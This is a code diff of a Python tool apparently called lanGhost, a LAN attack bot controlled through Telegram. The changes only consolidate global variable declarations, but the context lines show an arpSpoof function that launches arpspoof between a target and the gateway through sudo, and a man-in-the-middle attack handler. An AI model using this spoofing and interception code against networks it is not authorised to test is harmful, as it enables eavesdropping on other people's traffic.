@@ -25,6 +25,7 @@ try:
     import json
     import sys
     import os
+
 except KeyboardInterrupt:
     print("\n\n[+] Stopping...")
     raise SystemExit
@@ -34,11 +35,7 @@ except:
 
 def refreshNetworkInfo():
     try:
-        global iface_mac
-        global ip_range
-        global gw_ip
-        global gw_mac
-        global ip
+        global iface_mac, ip_range, gw_ip, gw_mac, ip
 
         iface_info = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]
         iface_mac = netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]["addr"]
@@ -287,15 +284,13 @@ def subscriptionHandler(bot):
         time.sleep(20)
 
 def arpSpoof(target):
-    global interface
-    global gw_ip
+    global iface_mac, gw_ip, gw_mac
     print("[+] ARP Spoofing " + str(target[0]) + "...")
     os.system("sudo screen -S lanGhost-arp-" + target[0] + "-0 -m -d arpspoof -t " + target[0] + " " + gw_ip + " -i " + interface)
     os.system("sudo screen -S lanGhost-arp-" + target[0] + "-1 -m -d arpspoof -t " + gw_ip + " " + target[0] + " -i " + interface)
 
 def mitmHandler(target, ID, bot):
-    global admin_chatid
-    global script_path
+    global admin_chatid, script_path
 
     while True:
         if attackManager("isrunning", ID=ID) == True:
@@ -1037,8 +1032,7 @@ def msg_scanip(bot, update, args):
         bot.send_message(chat_id=update.message.chat_id, text="❌ Whooops, something went wrong... Please try again.")
 
 def main():
-    global admin_chatid
-    global updater
+    global admin_chatid, updater
 
     updater = Updater(token=telegram_api)
     dispatcher = updater.dispatcher
